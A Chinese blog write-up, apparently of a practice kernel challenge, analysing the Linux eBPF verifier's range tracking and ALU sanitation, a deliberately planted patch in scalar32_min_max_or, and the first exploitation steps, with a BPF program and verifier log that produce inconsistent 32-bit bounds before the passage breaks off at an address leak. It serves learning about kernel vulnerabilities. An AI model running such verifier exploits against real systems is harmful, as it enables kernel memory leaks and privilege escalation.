<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">err = check_stack_slot_within_bounds(min_off, state, type);</span><br><span class="line"><span class="keyword">if</span> (!err)</span><br><span class="line">    err = check_stack_slot_within_bounds(max_off, state, type);</span><br></pre></td></tr></table></figure>

<p>这种跟踪寄存器和变量的取值范围的方式也经常被用于 BPF 之外的 JIT 中，因为 JIT 只需要优化和速度。</p>
<h2 id="ALU-Arithmetic-Logic-Unit-sanitation"><a href="#ALU-Arithmetic-Logic-Unit-sanitation" class="headerlink" title="ALU(Arithmetic Logic Unit) sanitation"></a>ALU(Arithmetic Logic Unit) sanitation</h2><p>到目前为止描述的类型检查和范围追踪是验证器的工作，但由于利用eBPF的攻击越来越多，近年来引入了一种新的缓解机制，称为 ALU sanitation。</p>
<p>攻击发生在 verifier 猜测错误，而引起了 oob。例如一个值实际为 32，但是 verifier 猜测为 0，那么就会触发 oob。</p>
<p><img src="/img/ebpf-12-10/simple_oob.png"></p>
<p>为了解决这些由于验证器错误导致的超范围引用，2019年引入了一种名为 ALU sanitation 的缓解机制。</p>
<p>在 ebpf 中，只有标量值的加减法被允许作为指针的一种操作。在 ALU sanitation 中，当标量值已知是指针和标量值相加的常数时，会被改写为常数操作 <code>BPF_ALUxx_IMM</code>。例如，假设 R1 是一个指向映射的指针；R2 是一个标量值的寄存器，猜测值为 0，实际为 1。这种情况下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2)</span><br></pre></td></tr></table></figure>

<p>因为 verifier 认为 R2 是一个常数 0，所以被改为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>该补丁最初是为了防止名为 Spectre 的侧信道攻击，但它对利用 verifier 漏洞的攻击也很有效。</p>
<p>此外，如果标量方不是常数，指令会使用 <code>alu_limit</code> 值进行修补。<strong>alu_limit 是一个数字，表示该指针最多可以增加或减少多少个值。</strong> 例如，如果指针指向一个大小为 0x10 的映射元素开始的第二个字节，并且由于 BPF_ADD 发生了与标量值的相加，<code>alu_limit</code> 即为 0xe。</p>
<p>和前面一样，考虑将标量值R2加到寄存器R1中，R1指向大小为0x10的地图元素开始的第二个字节：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG2)</span><br></pre></td></tr></table></figure>

<p>在 ALU sanitation 中，这条指令的修补方法如下（BPF_REG_AX 是一个辅助寄存器）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg),</span><br><span class="line">BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg),</span><br><span class="line">BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="number">0</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="number">63</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg),</span><br></pre></td></tr></table></figure>

<p>假设标量值 R2 超过了 0xe 的 <code>alu_limit</code>，但由于某些错误，验证器可能没有检测到它。但是在 ALU sanitation 中此时会产生了以下的指令序列：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_AX, <span class="number">0xe</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, BPF_REG_R2),</span><br><span class="line">BPF_ALU64_REG(BPF_OR, BPF_REG_AX, BPF_REG_R2),</span><br><span class="line">BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="number">0</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="number">63</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_AND, BPF_REG_AX, BPF_REG_R2),</span><br></pre></td></tr></table></figure>

<p>首先，前两条指令计算出 0xe-R2，如果 R2 在范围内，则为正数或零，如果超出范围则为负数；在下面的 OR 指令中，如果 AX 和 R2 的符号不同，最重要的符号位被设置为1。换句话说，当一个超范围的操作发生时，符号位在这时应该被设置为1；然后用 NEG 反转符号，用算术移位右移64位（像刷子带着符号位从左刷到右，如果 NEG 后是正的刷的都是 0，是负的刷的都是 1）；如果发生超范围引用，AX 被赋值为0，否则 AX 被赋值为 0xffffffffffffffffffffffffffff，最后，取 R2 和 AX 的 AND，这就是最终使用的偏移量。</p>
<h1 id="补丁与源码分析"><a href="#补丁与源码分析" class="headerlink" title="补丁与源码分析"></a>补丁与源码分析</h1><p>在作者提供的练习题目中，为了利用 ebpf 相关漏洞，人为打了一个补丁：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">7957c7957,7958</span><br><span class="line">&lt;               __mark_reg32_known(dst_reg, var32_off.value);</span><br><span class="line"><span class="comment">---</span></span><br><span class="line">&gt;               // `scalar_min_max_or` will handler the case</span><br><span class="line">&gt;               //__mark_reg32_known(dst_reg, var32_off.value);</span><br></pre></td></tr></table></figure>

<p>对 5.18.14 版本中 <a href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7957">kernel&#x2F;bpf&#x2F;verifier.c#7957</a> 进行了修改。</p>
<p><img src="/img/ebpf-12-10/0-1.png"></p>
<p><code>__mark_reg32_known</code> 函数在 <code>scalar32_min_max_or</code> 函数的开始被调用，补丁将其注释掉了。那么就主要关心他的作用。</p>
<h2 id="scalar32-min-max-or"><a href="#scalar32-min-max-or" class="headerlink" title="scalar32_min_max_or"></a>scalar32_min_max_or</h2><p>该函数仅被调用一次，在 <code>adjust_scalar_min_max_vals</code> 函数中：</p>
<p><img src="/img/ebpf-12-10/0-3.png"></p>
<p>根据注释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Calculate sign/unsigned bounds and tnum for alu32 and alu64 bit ops.</span><br><span class="line">* There are two classes of instructions: The first class we track both</span><br><span class="line">* alu32 and alu64 sign/unsigned bounds independently this provides the</span><br><span class="line">* greatest amount of precision when alu operations are mixed with jmp32</span><br><span class="line">* operations. These operations are BPF_ADD, BPF_SUB, BPF_MUL, BPF_ADD,</span><br><span class="line">* and BPF_OR. This is possible because these ops have fairly easy to</span><br><span class="line">* understand and calculate behavior in both 32-bit and 64-bit alu ops.</span><br><span class="line">* See alu32 verifier tests for examples. The second class of</span><br><span class="line">* operations, BPF_LSH, BPF_RSH, and BPF_ARSH, however are not so easy</span><br><span class="line">* with regards to tracking sign/unsigned bounds because the bits may</span><br><span class="line">* cross subreg boundaries in the alu64 case. When this happens we mark</span><br><span class="line">* the reg unbounded in the subreg bound space and use the resulting</span><br><span class="line">* tnum to calculate an approximation of the sign/unsigned bounds.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>该函数实现了 ALU 操作后目标寄存器的范围跟踪。</p>
<p>首先，目标寄存器 var_off 被更新为 tnum_or。 实现方法很简单：如果要 OR 的两个比特都是未知的，那么结果也是未知的。 即使其中一个位是未知的，掩码中的相应位也会被设置为0，因为如果另一个位是1的话，OR 的结果总是1：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TNUM(_v, _m)	(struct tnum)&#123;.value = _v, .mask = _m&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> tnum <span class="title function_">tnum_or</span><span class="params">(<span class="keyword">struct</span> tnum a, <span class="keyword">struct</span> tnum b)</span></span><br><span class="line">&#123;</span><br><span class="line">	u64 v, mu;</span><br><span class="line"></span><br><span class="line">	v = a.value | b.value;</span><br><span class="line">	mu = a.mask | b.mask;</span><br><span class="line">	<span class="keyword">return</span> TNUM(v, mu &amp; ~v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如，将 (mask&#x3D;0xffff0000; value&#x3D;0x1001) 和 (mask&#x3D;0xffffff00; value&#x3D;0x2) 进行OR，结果是 (mask&#x3D;0xffffef00; value&#x3D;0x1003)。</p>
<p>一旦 var_off 被更新，有关的标量 <code>scalar32_min_max_or</code> 就被调用。 当 src_known 和 dst_known 为真时，将达到 patch 中的删除部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line"><span class="type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">    <span class="comment">// `scalar_min_max_or` will handler the case</span></span><br><span class="line">    <span class="comment">//__mark_reg32_known(dst_reg, var32_off.value);</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>tnum_subreg_is_const</code> 当寄存器的低32位部分是常数时，返回 true。 <strong>换句话说，<code>__mark_reg32_known</code> 原本应该在两个要被 OR 的寄存器的低 32 位都是常数时被调用。</strong></p>
<p><code>__mark_reg32_known</code> 使用常数 var_off 更新 <code>s32_min_value</code>,  <code>s32_max_value</code>,  <code>u32_min_value</code> 和 <code>u32_max_value</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __mark_reg32_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const_subreg(reg-&gt;var_off, imm);</span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>patch 的注释中提到<code>scalar_min_max_or</code> will handler the case，那就看一下该函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">scalar_min_max_or</span><span class="params">(<span class="keyword">struct</span> bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="params">			      <span class="keyword">struct</span> bpf_reg_state *src_reg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	u64 umin_val = src_reg-&gt;umin_value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">		__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这基本上就是一个 64 位版本的 <code>scalar32_min_max_or</code>。这里当两个 64 位的值都是常数时，<code>__mark_reg_known</code> 被调用。<code>__mark_reg_known</code> 除了 64 位的部分外，还将 32 位的范围改为常数（注意开头的下划线个数）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> ___mark_reg_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">	reg-&gt;smin_value = (s64)imm;</span><br><span class="line">	reg-&gt;smax_value = (s64)imm;</span><br><span class="line">	reg-&gt;umin_value = imm;</span><br><span class="line">	reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __mark_reg_known(<span class="keyword">struct</span> bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line">	<span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">	       offsetof(<span class="keyword">struct</span> bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">	___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>换句话说，<strong>如果执行 OR 运算的两个 64 位寄存器都是常数，就不需要在 <code>scalar32_min_max_or</code> 中调用<code>__mark_reg32_known</code>，随后的 <code>scalar_min_max_or</code> 会使它们成为常数，不会有问题。</strong></p>
<p>那么，如果一个 64 位寄存器的低 32 位是常数，而前 32 位不是恒定的呢？<code> scalar32_min_max_or</code> 立即返回（因为他只检测低 32 位，都是常数就执行到 patch 处，而由于 patch 后只有 return 了所以直接返回）。而 <code>__mark_reg_known</code> 在 <code>scalar_min_max_or</code> 中肯定不会被调用。在这种情况下，会在 <code>scalar_min_max_or</code> 继续执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We get our maximum from the var_off, and our minimum is the</span></span><br><span class="line"><span class="comment"> * maximum of the operands&#x27; minima</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">dst_reg-&gt;umin_value = max(dst_reg-&gt;umin_value, umin_val);</span><br><span class="line">dst_reg-&gt;umax_value = dst_reg-&gt;var_off.value | dst_reg-&gt;var_off.mask;</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="comment">/* Lose signed bounds when ORing negative numbers,</span></span><br><span class="line"><span class="comment">	 * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">	dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* ORing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">	 * cast result into s64.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">	dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">__update_reg_bounds(dst_reg);</span><br></pre></td></tr></table></figure>

<p>在更新 <code>umin_value</code>,  <code>umax_value</code>,  <code>smin_value</code> 和 <code>smax_value</code> 之后，调用 <code>__update_reg_bounds</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __update_reg_bounds(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	__update_reg32_bounds(reg);</span><br><span class="line">	__update_reg64_bounds(reg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也对 32 位和 64 位的范围进行了更新。 那么，这个补丁是否只是删除了不必要的处理？</p>
<h2 id="update-reg32-bounds"><a href="#update-reg32-bounds" class="headerlink" title="__update_reg32_bounds"></a>__update_reg32_bounds</h2><p>仔细看一下 <a href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L1298"><code>__update_reg32_bounds</code></a> 流程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> max_t(type, x, y)	max((type)x, (type)y)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __update_reg32_bounds(<span class="keyword">struct</span> bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;s32_min_value = <span class="type">max_t</span>(s32, reg-&gt;s32_min_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;s32_max_value = <span class="type">min_t</span>(s32, reg-&gt;s32_max_value,</span><br><span class="line">			var32_off.value | (var32_off.mask &amp; S32_MAX));</span><br><span class="line">	reg-&gt;u32_min_value = <span class="type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">	reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">				 (u32)(var32_off.value | var32_off.mask));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再回看一下 patch 的点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BPF_OR:</span><br><span class="line">    dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">    scalar32_min_max_or(dst_reg, &amp;src_reg);		<span class="comment">//	==&gt; patch: no __mark_reg32_known !</span></span><br><span class="line">    scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>和上面一样，假设此时处理的 OR 的两个操作寄存器都是 64 位。<strong>由于 <code>__mark_reg32_known</code> 在 <code> scalar32_min_max_or</code> 没有被调用，32位的 min，max 仍然是旧状态。 这是否可以用来导致最小、最大的不一致被更新？</strong> 为了简单起见，先考虑无符号的情况：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">reg-&gt;u32_min_value = <span class="type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,</span><br><span class="line">			 (u32)(var32_off.value | var32_off.mask));</span><br></pre></td></tr></table></figure>

<p>现在，寄存器的低 32 位对于 src 和 dst 都是定值。 因此，<code>var32_off.mask</code> 为 0，可以改写为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">reg-&gt;u32_min_value = max(reg-&gt;u32_min_value, var32_off.value);</span><br><span class="line">reg-&gt;u32_max_value = min(reg-&gt;u32_max_value, var32_off.value);</span><br></pre></td></tr></table></figure>

<p><code>u32_min_value</code> 和 <code>u32_max_value</code> 继承了目标寄存器的原始状态。下面的 32 位必须是常数，所以假设原来的<code>u32_min_value</code> 和 <code>u32_max_value</code> 都是 X（范围 [x,x] 即常数 x）。 此时某个常数 Y 与之或，结果是 X|Y。 那么，如果 X|Y &gt; X，那么：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">reg-&gt;u32_min_value = max(X, X|Y); <span class="comment">// min=X|Y</span></span><br><span class="line">reg-&gt;u32_max_value = min(X, X|Y); <span class="comment">// max=X</span></span><br></pre></td></tr></table></figure>

<p>此时 <code>u32_min_value</code> 大于 <code>u32_max_value</code> ，出现不一致。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="漏洞再现"><a href="#漏洞再现" class="headerlink" title="漏洞再现"></a>漏洞再现</h2><p>为了简单起见，假设 X&#x3D;0，Y&#x3D;1（分别为 R1，R2 的低位）。首先，准备以下寄存器R1和R2：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">R1: var_off=(value=<span class="number">0</span>; mask=<span class="number">0xffffffff00000000</span>)</span><br><span class="line">R2: var_off=(value=<span class="number">0xfffffffe00000001</span>; mask=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>让我们看看与 BPF_OR(R1, R2) 进行 OR 时的变化。</p>
<ol>
<li>var_off&#x3D;(value&#x3D;0xfffffffe00000001; mask&#x3D;0x100000000)	(计算方式在上面 tnum_or)</li>
<li>u32_min_value &#x3D; max(0, 1) &#x3D; 1</li>
<li>u32_max_value &#x3D; min(0, 1) &#x3D; 0</li>
</ol>
<p>这就在 32 位部分创建了一个最小值为1、最大值为0的危险的寄存器。 让我们在实际代码中检查一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xFFFFFFFE</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在内核中跑起该程序并打印输出：</p>
<blockquote>
<p>下载后在 ubuntu20.04 中直接 run.sh 起不来，搜索了一下，找到了<a href="https://www.cnblogs.com/Rainingday/p/12483773.html">解决办法</a>，ok</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ $ ./exp</span><br><span class="line"><span class="meta prompt_">func#</span><span class="language-bash">0 @0</span></span><br><span class="line">0: R1=ctx(off=0,imm=0) R10=fp0</span><br><span class="line">0: (7a) *(u64 *)(r10 -8) = 0          ; R10=fp0 fp-8_w=mmmmmmmm</span><br><span class="line">1: (18) r1 = 0x0                      ; R1_w=map_ptr(off=0,ks=4,vs=8,imm=0)</span><br><span class="line">3: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0</span><br><span class="line">4: (07) r2 += -8                      ; R2_w=fp-8</span><br><span class="line">5: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,off=0,ks=4,vs=8,imm=0)</span><br><span class="line">6: (55) if r0 != 0x0 goto pc+1        ; R0_w=P0</span><br><span class="line">7: (95) exit</span><br><span class="line"></span><br><span class="line">from 6 to 8: R0=map_value(off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8=mmmmmmmm</span><br><span class="line">8: (79) r1 = *(u64 *)(r0 +0)          ; R0=map_value(off=0,ks=4,vs=8,imm=0) R1_w=Pscalar()</span><br><span class="line">9: (77) r1 &gt;&gt;= 32                     ; R1_w=Pscalar(umax=4294967295,var_off=(0x0; 0xffffffff))</span><br><span class="line">10: (67) r1 &lt;&lt;= 32                    ; R1_w=Pscalar(smax=9223372032559808512,umax=18446744069414584320,var_off=(0x0; 0xffffffff00000000),s32_min=0,s32_max=0,u32_max=0)</span><br><span class="line">11: (b7) r2 = -2                      ; R2_w=P-2</span><br><span class="line">12: (67) r2 &lt;&lt;= 32                    ; R2_w=P-8589934592</span><br><span class="line">13: (07) r2 += 1                      ; R2_w=P-8589934591</span><br><span class="line">14: (4f) r1 |= r2                     ; R1_w=Pscalar(umin=18446744065119617025,umax=18446744069414584321,var_off=(0xfffffffe00000001; 0x100000000),s32_min=1,s32_max=0,u32_min=1,u32_max=0) R2_w=P-8589934591</span><br><span class="line">15: (b7) r0 = 0                       ; R0_w=P0</span><br><span class="line">16: (95) exit</span><br><span class="line">processed 16 insns (limit 1000000) max_states_per_insn 0 total_states 1 peak_states 1 mark_read 1</span><br></pre></td></tr></table></figure>

<p>第十四条指令运行完：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s32_min=<span class="number">1</span>,s32_max=<span class="number">0</span>,u32_min=<span class="number">1</span>,u32_max=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>此时印证了前面的分析，出现了<strong>有问题的范围跟踪</strong>。</p>
<h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>如果像前面提到的那样，创建了 min_value &gt; max_value 的条件，有几种方法可以利用它。 首先，让我们把它用于映射中的地址泄漏。</p>
<p>在 eBPF 中允许对标量值进行加减，也允许对指针进行加减。 对指针和标量值的操作中的偏移更新是在<a href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7480"><code>adjust_ptr_min_max_vals</code></a> 中实现的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">adjust_ptr_min_max_vals</span><span class="params">(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> bpf_insn *insn,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *ptr_reg,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *off_reg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);</span><br><span class="line">	s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,</span><br><span class="line">	    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;</span><br><span class="line">	u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,</span><br><span class="line">	    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||</span><br><span class="line">		smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;</span><br><span class="line">		<span class="comment">/* Taint dst register if offset had invalid bounds derived from</span></span><br><span class="line"><span class="comment">		 * e.g. dead branches.</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		__mark_reg_unknown(env, dst_reg);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码显示，在标量值方面的跟踪被破坏的情况下，就像本例一样，<strong>计算结果被 <code>__mark_reg_unknown</code> 变成了未知的。也就是说，如果你把一个指针加到一个有跟踪破坏的寄存器上，计算的结果会被当作一个标量值来处理。标量值可以写入 BPF 映射，以此来进行地址泄露。</strong>让我们用 <code>map_lookup_elem</code> 获得的 BPF 映射的指针泄漏。</p>
<p>之前破坏了对 <code>s32_min_value</code> 等的推测。但是上面的代码需要破坏 64 位的寄存器，如 smin_val。要把一个对 32 位值的不准确推测扩展为 64 位值的不准确推测，只需使用 BPF_MOV32_REG 把它复制到一个 32 位的寄存器中，就像在 x86-64 中一样（没太理解什么意思，反正就照做了）：</p>
